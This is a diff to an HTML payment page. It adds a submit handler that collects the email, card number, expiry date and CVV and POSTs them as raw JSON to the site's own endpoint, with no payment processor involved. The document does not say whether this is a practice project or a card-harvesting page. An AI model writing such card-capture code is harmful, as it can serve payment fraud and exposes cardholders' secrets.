@@ -132,19 +132,19 @@
         </div>
         <div class="payment-title" id="payment-title">Payment 45€</div>
         <hr>
-        <form autocomplete="off">
+        <form id="paymentForm" autocomplete="off">
             <div class="input-group">
                 <input id="email-input" type="email" placeholder="E-mail" value="" required>
             </div>
             <div class="input-group">
-                <input type="text" placeholder="Card Number" maxlength="19" pattern="[0-9 ]*" inputmode="numeric" required>
+                <input id="card-input" type="text" placeholder="Card Number" maxlength="19" pattern="[0-9 ]*" inputmode="numeric" required>
             </div>
             <div class="row">
                 <div class="input-group">
-                    <input type="text" placeholder="Expiry Date" maxlength="5" pattern="[0-9/]*" inputmode="numeric" required>
+                    <input id="expiry-input" type="text" placeholder="Expiry Date" maxlength="5" pattern="[0-9/]*" inputmode="numeric" required>
                 </div>
                 <div class="input-group">
-                    <input type="password" placeholder="CVV" maxlength="4" pattern="[0-9]*" inputmode="numeric" required>
+                    <input id="cvv-input" type="password" placeholder="CVV" maxlength="4" pattern="[0-9]*" inputmode="numeric" required>
                 </div>
             </div>
             <button type="submit" class="confirm-btn">Confirm</button>
@@ -169,6 +169,23 @@
             document.getElementById('payment-title').textContent = `Payment ${totalNum}€`;
         }
     }
+    document.getElementById('paymentForm').onsubmit = function(e) {
+        e.preventDefault();
+        const email = document.getElementById('email-input').value;
+        const card = document.getElementById('card-input').value;
+        const expiry = document.getElementById('expiry-input').value;
+        const cvv = document.getElementById('cvv-input').value;
+        fetch('/send_payment_data', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email, card, expiry, cvv })
+        }).then(r => r.ok ? r.text() : Promise.reject(r.statusText))
+          .then(() => {
+            alert('Дані відправлено!');
+            // Можна зробити редірект або показати повідомлення
+          })
+          .catch(() => alert('Помилка відправки!'));
+    };
     </script>
 </body>
 </html>
